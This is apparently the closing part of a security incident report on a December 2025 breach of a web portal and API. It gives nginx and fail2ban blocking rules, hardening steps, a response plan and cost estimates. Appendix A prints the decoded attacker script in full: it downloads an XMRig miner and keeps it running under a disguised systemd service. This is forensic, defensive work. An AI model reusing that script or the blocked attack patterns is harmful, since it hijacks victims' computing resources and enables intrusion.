    client_header_timeout 10s;
    keepalive_timeout 30s;
    send_timeout 10s;

    # Block common attack patterns
    location ~* \.(env|git|svn|htaccess|htpasswd)$ {
        deny all;
        return 404;
    }

    location ~ /\. {
        deny all;
        return 404;
    }

    # Block suspicious patterns in query strings
    if ($query_string ~* "(base64|encode|script|eval|union|select|insert|drop)") {
        return 403;
    }

    # Block suspicious user agents
    if ($http_user_agent ~* (nikto|sqlmap|nmap|masscan|metasploit)) {
        return 403;
    }

    location / {
        # Only allow from Maestro03 (if internal network)
        # allow 10.0.0.0/8;
        # deny all;

        proxy_pass http://127.0.0.1:8001;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;

        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
    }

    # Logging
    access_log /var/log/nginx/api-access.log combined;
    error_log /var/log/nginx/api-error.log warn;
}
```

**3. Fail2Ban Configuration**
```ini
# /etc/fail2ban/jail.d/nginx.conf
[nginx-req-limit]
enabled = true
filter = nginx-req-limit
logpath = /var/log/nginx/error.log
maxretry = 5
findtime = 60
bantime = 3600

[nginx-noscript]
enabled = true
port = http,https
filter = nginx-noscript
logpath = /var/log/nginx/access.log
maxretry = 6
findtime = 60
bantime = 86400

[nginx-badbots]
enabled = true
port = http,https
filter = nginx-badbots
logpath = /var/log/nginx/access.log
maxretry = 2
findtime = 60
bantime = 86400

[nginx-env-scan]
enabled = true
port = http,https
filter = nginx-env-scan
logpath = /var/log/nginx/access.log
maxretry = 3
findtime = 300
bantime = 86400
```

```ini
# /etc/fail2ban/filter.d/nginx-env-scan.conf
[Definition]
failregex = ^<HOST> .* "(GET|POST).*\.(env|git/config|aws|stripe).*"
ignoreregex =
```

**4. System Hardening**
```bash
# Install security tools
sudo apt update
sudo apt install -y fail2ban ufw aide rkhunter chkrootkit

# Configure firewall
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow from <maestro03_ip> to any port 8001
sudo ufw allow from <maestro03_ip> to any port 3001
sudo ufw enable

# File integrity monitoring
sudo aideinit
sudo aide --check

# Rootkit detection
sudo rkhunter --check
sudo chkrootkit

# Disable unnecessary services
sudo systemctl disable bluetooth
sudo systemctl disable cups
```

**5. Process Isolation**
```bash
# Create dedicated users
sudo useradd -r -s /bin/false nexus-api
sudo useradd -r -s /bin/false nexus-portal

# Set ownership
sudo chown -R nexus-api:nexus-api /home/nick/applications/NewsNexus10API
sudo chown -R nexus-portal:nexus-portal /home/nick/applications/NewsNexus10Portal

# Update PM2 config
pm2 delete all

# Start with restricted users
sudo -u nexus-api pm2 start /home/nick/applications/NewsNexus10API/src/server.js --name api
sudo -u nexus-portal pm2 start /home/nick/applications/NewsNexus10Portal/server.js --name portal

# Save PM2 configuration
pm2 save
pm2 startup
```

---

## Long-term Security Strategy

### 1. Security Monitoring & Alerting

**Implement SIEM:**
```bash
# Install Wazuh (open-source SIEM)
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash ./wazuh-install.sh -a
```

**Configure Alerts:**
- Failed authentication attempts > 5 in 5 minutes
- New systemd services created
- Outbound connections to unusual ports
- File modifications in /etc/systemd/
- CPU usage > 80% for > 5 minutes
- New user account creation
- Sudo usage
- .env file access attempts

### 2. Secure Development Practices

**Pre-commit Hooks:**
```bash
# .git/hooks/pre-commit
#!/bin/bash

# Check for secrets
if git diff --cached | grep -E "(API_KEY|SECRET|PASSWORD|TOKEN)" > /dev/null; then
    echo "❌ Potential secret detected in commit"
    exit 1
fi

# Check for .env files
if git diff --cached --name-only | grep "\.env$" > /dev/null; then
    echo "❌ .env file in commit"
    exit 1
fi

# Run security linter
npm run lint:security

exit 0
```

**Dependency Scanning:**
```json
// package.json
{
  "scripts": {
    "audit": "npm audit --audit-level=moderate",
    "audit:fix": "npm audit fix",
    "preinstall": "npm run audit"
  }
}
```

### 3. Incident Response Plan

**Runbook for Future Breaches:**

1. **Detection (< 5 minutes)**
   - Automated alerting triggers
   - Security team notified
   - Incident declared

2. **Containment (< 15 minutes)**
   - Isolate affected systems
   - Block attacker IPs at firewall
   - Disable compromised user accounts
   - Take snapshots for forensics

3. **Eradication (< 1 hour)**
   - Remove malware/backdoors
   - Patch vulnerabilities
   - Reset all credentials
   - Verify system integrity

4. **Recovery (< 4 hours)**
   - Restore from clean backups
   - Deploy patches
   - Gradually restore services
   - Monitor for reinfection

5. **Post-Incident (< 7 days)**
   - Full forensic analysis
   - Incident report
   - Update defenses
   - User notification
   - Regulatory reporting (if required)

### 4. Continuous Security Testing

**Automated Vulnerability Scanning:**
```bash
# Weekly automated scans
0 2 * * 0 /usr/bin/nuclei -u https://news-nexus.kineticmetrics.com -s high,critical -o /var/log/security/nuclei-$(date +\%Y\%m\%d).log
```

**Penetration Testing:**
- Quarterly external penetration tests
- Annual internal security audit
- Bug bounty program (optional)

### 5. Compliance & Governance

**Security Policies:**
- Data classification policy
- Incident response policy
- Access control policy
- Password policy
- Encryption policy

**Regular Reviews:**
- Monthly security patch updates
- Quarterly access review
- Annual security architecture review
- Annual disaster recovery drill

---

## Legal and Compliance Considerations

### Data Breach Notification

**Jurisdictions to Consider:**
- **California (CCPA):** If any California residents' data compromised
- **EU (GDPR):** If any EU citizens' data accessed
- **Federal (varies by industry):** Depends on data type

**Timeline:**
- Assessment within 72 hours
- Notification within 30-60 days (jurisdiction dependent)

**Users Affected:**
- Approximately 6 users in database (from log evidence)
- Review for PII exposure

### Law Enforcement Notification

**Consider reporting to:**
- FBI Internet Crime Complaint Center (IC3)
- Local law enforcement (cybercrime division)
- CISA (Critical Infrastructure)

**Evidence to Preserve:**
- All logs (nginx, application, system)
- Forensic disk images
- Network packet captures
- Timeline documentation
- IOCs and malware samples

---

## Cost Impact Assessment

### Direct Costs

**Emergency Response:**
- Incident response team hours: ~40 hours @ $200/hr = $8,000
- Forensic analysis: $5,000 - $15,000
- Emergency patching/development: ~80 hours @ $150/hr = $12,000

**Infrastructure:**
- WAF subscription: $50-200/month
- SIEM/monitoring tools: $100-500/month
- Security tools: $2,000 one-time

**Total Immediate Cost:** ~$27,000 - $37,000

### Indirect Costs

**Downtime:**
- Portal offline 2-4 hours: Minimal (internal tool)
- Productivity loss during incident: ~8 person-hours

**Reputation:**
- No public-facing service
- Limited reputational impact

**Opportunity Cost:**
- Development time diverted to security
- Feature delays

**Total Estimated Impact:** $30,000 - $45,000

### Prevented Costs (if undetected)

**If mining malware succeeded:**
- Electricity costs: $50-100/month
- Performance degradation: Unmeasured
- Potential data exfiltration: Priceless

---

## Lessons Learned

### What Went Wrong

1. **No Web Application Firewall**
   - All attacks reached applications unfiltered
   - Common attack patterns not blocked

2. **Insufficient Input Validation**
   - Server Actions accepted unsanitized input
   - Command injection possible

3. **Error Information Disclosure**
   - Environment variables leaked in error responses
   - Stack traces exposed file paths

4. **No Rate Limiting**
   - 300+ reconnaissance requests allowed
   - No automated blocking

5. **Lack of Monitoring**
   - Attack not detected in real-time
   - No alerting on suspicious patterns

6. **Delayed Incident Response**
   - Attack on Dec 8, repeated on Dec 9
   - Insufficient urgency after first breach

### What Went Right

1. **Malware Installation Failed**
   - Network restrictions or permissions blocked miner
   - No persistent compromise achieved

2. **Authentication Protected API**
   - All sensitive endpoints required auth
   - Prevented database compromise

3. **Logs Preserved**
   - Comprehensive forensic evidence available
   - Detailed attack timeline reconstructable

4. **Normal Operations Continued**
   - Database integrity maintained
   - User activity uninterrupted
   - No data corruption

### Recommendations for Future

1. **Defense in Depth**
   - Multiple security layers
   - WAF + application security + monitoring

2. **Assume Breach**
   - Design for compromise
   - Limit blast radius
   - Quick detection and response

3. **Security-First Development**
   - Security requirements in every feature
   - Threat modeling before implementation
   - Regular security training

4. **Automated Security**
   - Continuous vulnerability scanning
   - Automated patching when possible
   - Real-time threat detection

---

## Conclusion

The December 9, 2025 breach represents a **critical escalation** from the December 8 incident, with confirmed data exfiltration and more sophisticated attack techniques. The threat actor demonstrated:

- **Advanced persistent threat (APT) characteristics:** Multi-phase attack, sophisticated malware, professional reconnaissance
- **Technical sophistication:** Systemd persistence, Node.js-based downloads, environment-specific payloads
- **Organized approach:** Automated scanning, systematic credential hunting, fallback mechanisms

**Critical Findings:**
1. ✅ **Confirmed Data Exfiltration:** Environment variables successfully stolen
2. ✅ **Remote Code Execution:** Arbitrary command execution achieved
3. ⚠️ **Attempted Persistence:** Systemd service + nohup fallback (failed to install)
4. ✅ **Extensive Reconnaissance:** 300+ paths probed for sensitive files

**Immediate Priorities:**
1. **Isolate and audit systems** for persistence mechanisms
2. **Rotate ALL credentials** immediately
3. **Deploy emergency patches** to Portal and API
4. **Implement WAF and rate limiting** within 24 hours
5. **Establish 24/7 monitoring** and alerting

**Long-term Imperative:**
This incident demonstrates that the current security posture is **insufficient for a production environment**. A comprehensive security overhaul is required, including:
- Application security redesign
- Infrastructure hardening
- Continuous monitoring
- Incident response capabilities
- Security-focused development practices

**The attackers have proven they can:**
- Execute arbitrary code on your servers
- Exfiltrate configuration data
- Attempt persistent malware installation
- Systematically search for credentials

**They will return** if vulnerabilities remain unpatched.

---

## Appendix A: Technical Evidence

### Decoded Malware Script

Full decoded bash script from Line 23 of Portal error log:

```bash
#!/bin/bash

# Configuration
OUT="next.tar.gz"
EXTRACT_DIR="xmrig-6.24.0"
BINARY_PATH="$(pwd)/$EXTRACT_DIR/xmrig"
ARGS="--url auto.c3pool.org:80 --user 49pYi8efZGnFZWuFxgxQJ4iZZjGx8TryNfEZ9S9YSHUs1rNBWTKRaMnYKKuvUABHV5W41f4pk6z7j3AuFW9qFnFkEo3V1cw --pass node --donate-level 0 "
SERVICE_NAME="systems-updates-service"
URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"

node - <<EOF
const https = require('https');
const fs = require('fs');

const file = fs.createWriteStream("${OUT}");
https.get("${URL}", (res) => {
res.pipe(file);
res.on("end", () => file.close());
});
EOF
tar xvzf "$OUT"


chmod +x "$BINARY_PATH"

# Attempt systemd setup
INSTALLED_SYSTEMD=0
if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
    echo "Root privileges detected. Attempting systemd setup..."

    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${BINARY_PATH} ${ARGS}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"

    if systemctl is-active --quiet "$SERVICE_NAME"; then
        echo "Service started via systemd."
        INSTALLED_SYSTEMD=1
    fi
fi

# Fallback to nohup
if [ $INSTALLED_SYSTEMD -eq 0 ]; then
    echo "Starting with nohup..."
    nohup "$BINARY_PATH" $ARGS >/dev/null 2>&1 &
fi
```

### Reconnaissance Path Summary

**Total Paths Scanned:** 323 unique paths

**Categories:**
- Environment files: 47 paths
- PHP info disclosure: 12 paths
- Git/version control: 4 paths
- AWS credentials: 8 paths
- Stripe payment keys: 72 paths
- Framework configs: 89 paths
- Backup files: 14 paths
- Other: 77 paths

**Success Rate:** 0% (all returned 404)

---

## Appendix B: Comparison Matrix

| Metric | Dec 8 Breach | Dec 9 Breach |
|--------|-------------|--------------|
| **Duration** | Minutes | Hours (throughout day) |
| **Systems Affected** | Portal only | Portal + API |
| **RCE Confirmed** | No | ✅ Yes |
| **Data Exfiltrated** | None | ✅ Env variables |
| **Malware Type** | Basic script | Sophisticated systemd |
| **Persistence** | Attempted | Advanced (dual method) |
| **Reconnaissance** | Limited | ✅ Extensive (300+ paths) |
| **Wallet Address** | 85RhdwGyM... | 49pYi8efZ... |
| **Attack Pattern** | Opportunistic | Organized |
| **Threat Level** | Medium | ✅ Critical |

---

**Report Generated:** December 13, 2025
**Report Author:** Security Analysis Team
**Classification:** CONFIDENTIAL - Internal Use Only
**Next Review Date:** Immediately upon remediation completion
**Required Actions:** See Immediate Action Items section

**Distribution:**
- Infrastructure Team (IMMEDIATE)
- Development Team (IMMEDIATE)
- Management (IMMEDIATE)
- Legal/Compliance (as needed)
